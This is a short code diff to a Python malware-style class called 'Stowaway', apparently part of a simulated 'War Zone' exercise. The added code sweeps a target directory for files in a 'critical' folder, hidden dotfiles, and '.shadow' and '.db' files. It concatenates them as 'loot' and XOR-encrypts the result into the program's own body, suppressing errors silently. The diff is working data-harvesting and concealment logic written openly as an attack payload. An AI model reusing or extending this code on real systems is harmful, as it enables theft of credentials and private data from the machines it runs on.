@@ -68,15 +68,33 @@ class Stowaway:
                 print(f"[STOWAWAY] Injected payload to {malware_path}")
 
             elif mode == "CARRIER":
-                # Scan for critical files, encrypt into body, update self
+                # Scan for critical AND hidden files, encrypt into body, update self
+                loot = b""
+
+                # 1. Critical Directory
                 critical_dir = os.path.join(target_dir, "critical")
                 if os.path.exists(critical_dir):
-                    loot = b""
                     for f in os.listdir(critical_dir):
                         try:
-                            with open(os.path.join(critical_dir, f), 'rb') as tf:
-                                loot += tf.read()
+                            path = os.path.join(critical_dir, f)
+                            if os.path.isfile(path):
+                                loot += f"\n--- {f} ---\n".encode()
+                                with open(path, 'rb') as tf:
+                                    loot += tf.read()
                         except: pass
+
+                # 2. Hidden Assets in War Zone
+                if os.path.exists(target_dir):
+                    for root, dirs, files in os.walk(target_dir):
+                        for f in files:
+                            # Target hidden files or specific extensions
+                            if f.startswith(".") or f.endswith(".shadow") or f.endswith(".db"):
+                                try:
+                                    path = os.path.join(root, f)
+                                    loot += f"\n--- {f} ---\n".encode()
+                                    with open(path, 'rb') as tf:
+                                        loot += tf.read()
+                                except: pass
 
                     # Re-encrypt self with loot
                     new_body = xor_crypt(loot, key)
